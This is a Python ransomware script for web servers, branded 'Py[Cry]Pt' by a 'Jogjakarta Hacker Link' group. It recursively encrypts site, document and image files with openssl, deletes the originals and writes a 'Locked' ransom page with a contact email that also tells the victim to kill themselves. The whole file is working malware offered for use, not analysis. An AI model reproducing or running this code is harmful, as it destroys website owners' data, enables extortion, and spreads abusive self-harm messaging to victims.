import os,sys

name 	  = "FilthyRoot"
email 	  = "soracyberteam@gmail.com"

file_ext  = ['.php','.py', '.html', '.shtml', '.txt', '.pdf', '.jpg', '.jpeg', '.png', '.gif', '.doc', '.docx', '.cer', '.fla', '.asp','.aspx', '.pycrypt']
blacklist = ['run.py', 'pycrypt.html', '.htaccess', 'idx.php']

def tulis_index(dir):
	global name, email
	content = '''<title>Locked! by {}</title>
<center>
<pre>
Locked by {}
------------------

Your website has been locked!
Kill ur self!

Need Help?
Contact : {}

<i>Jogjakarta Hacker Rulez &copy 2020</i>'''.format(name, name, email)

	f = open(dir+"/pycrypt.html", "w")
	f.write(content)
	if f.close():
		x = open(dir + "/.htaccess", "w")
		x.write("DirectoryIndex pycrypt.html")
		if x.close():
			return True
		else:
			return False
	else:
		return False


def encrypt(dir,password):
	command = "openssl aes-256-cbc -in '{}' -out '{}.pycrypt' -k {} > /dev/null 2>&1".format(dir, dir, password)
	os.system(command)
	os.remove(dir)
	print(dir + " -> ENC!")
def decrypt(dir, password):
	try:
		new     = dir.replace(".pycrypt", "")
	except:
		pass
	command = "openssl aes-256-cbc -d -in '{}' -out '{}' -k {} > /dev/null 2>&1".format(dir, new, password)
	os.system(command)
	os.remove(dir)
	print(dir + "-> DEC!")
def crying(dir , opt, password):
	try:
		tulis_index(dir)
	except:
		pass
	files = os.scandir(path = dir)
	for i in files:
		if i.is_dir():
			crying(dir + "/" + i.name, opt, password)
		elif i.is_file() and os.path.basename(dir + "/" + i.name) not in blacklist and os.path.splitext(dir + "/" + i.name)[1] in file_ext:
			if opt == "enc":
				encrypt(dir + "/" + i.name, password)
			elif opt == "dec":
				os.remove(dir + "/.htaccess")
				decrypt(dir + "/" + i.name, password)
def banner():
	print("Py[Cry]Pt by Jogjakarta Hacker Link")


if len(sys.argv) < 3:
	banner()
	print('Usage : run.py [enc/dec] [start dir] [password]')
else:
	banner()
	opt  	  = sys.argv[1]
	dir		  = sys.argv[2]
	password  = sys.argv[3]

	crying(dir, opt, password)
	#tulis_index(dir)
